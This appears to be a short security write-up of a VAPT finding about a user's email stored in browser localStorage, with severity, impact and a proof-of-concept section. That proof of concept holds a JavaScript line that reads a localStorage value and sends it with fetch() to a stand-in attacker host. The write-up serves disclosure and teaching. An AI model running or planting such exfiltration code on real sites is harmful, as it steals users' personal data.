# 🔐 Sensitive Data Exposure via LocalStorage

## 📌 Overview
This project demonstrates a security vulnerability identified during a VAPT exercise where **sensitive user information (PII)** was stored in browser localStorage.

---

## 🚨 Vulnerability Details

- **Title:** Sensitive User Information Disclosure via Insecure Storage in LocalStorage  
- **Category:** OWASP Top 10 – A02:2021 (Cryptographic Failures)  
- **Severity:** Medium (High when chained with XSS)

---

## 🔍 Description

The application stores user email in localStorage, which is accessible via JavaScript and persists even after logout.

This creates a security risk where attackers can extract sensitive information if a Cross-Site Scripting (XSS) vulnerability exists.

---

## ⚠️ Impact

- Exposure of user email (PII)
- Increased attack surface via XSS
- Potential data exfiltration

---

## 💣 Proof of Concept (PoC)

```js
// Extract sensitive data
const data = localStorage.getItem("cly_id");

// Exfiltrate to attacker server
fetch("https://attacker.com/steal?data=" + data);
